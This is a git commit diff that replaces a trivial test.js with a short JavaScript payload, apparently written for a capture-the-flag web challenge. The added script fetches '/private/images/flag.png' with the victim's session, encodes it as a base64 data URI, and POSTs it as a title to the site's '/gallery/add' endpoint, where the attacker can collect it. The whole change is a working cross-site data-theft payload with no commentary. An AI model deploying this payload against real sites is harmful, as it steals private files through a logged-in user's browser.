89c87926b82d69240410906a07121d9071c6181c
JeanBobNinja <mathieu.menuet@live.fr>
2022-04-02 04:02:08 +0200

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,17 @@
-console.log("test");
+function post(content) {
+ fetch('/gallery/add', {
+   method: 'POST',
+   headers: {
+    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
+   },
+   body: "title="+encodeURIComponent(content)+"&link=http%3A%2F%2Ffoo%2Ecom&uuid="+document.location.pathname.split("/")[2]
+ }) 
+}
+
+fetch('/private/images/flag.png')
+.then( response => response.blob() )
+.then( blob =>{
+    var reader = new FileReader() ;
+    reader.onload = function(){ post(this.result) } ; // <--- `this.result` contains a base64 data URI
+    reader.readAsDataURL(blob) ;
+}) ;
